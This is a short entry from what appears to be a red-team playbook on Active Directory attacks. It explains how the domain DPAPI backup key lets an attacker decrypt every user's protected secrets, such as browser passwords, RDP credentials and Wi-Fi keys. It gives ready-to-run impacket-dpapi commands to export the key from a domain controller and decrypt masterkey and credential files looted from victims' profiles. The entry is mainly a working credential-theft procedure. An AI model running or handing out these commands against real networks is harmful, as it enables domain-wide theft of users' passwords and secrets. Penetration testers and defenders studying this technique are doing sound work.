---
id: dpapi-backupkey
title: DPAPI domain backup key (decrypt any user's secrets)
section: Active Directory — attack paths
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1555]
platform: [windows, network]
source: Benjamin Delpy (mimikatz DPAPI) & Will Schroeder (SharpDPAPI), DPAPI research
pair: dpapi-backupkey-5145
---

The domain DPAPI backup key is the master skeleton key for every user's
DPAPI-protected secrets — browser passwords, saved RDP/creds, Wi-Fi keys. With DA
you pull it once over the BackupKey Remote Protocol (MS-BKRP), then decrypt any
captured masterkey + credential blob *offline*, forever. `<masterkey-file>` /
`<credential-blob>` are files looted from the target's profile.

```sh
impacket-dpapi backupkeys -t {{domain}}/{{user}}:{{password}}@{{rhost}} --export
impacket-dpapi masterkey -file <masterkey-file> -pvk key.pvk
impacket-dpapi credential -file <credential-blob> -key <decrypted-masterkey>
```
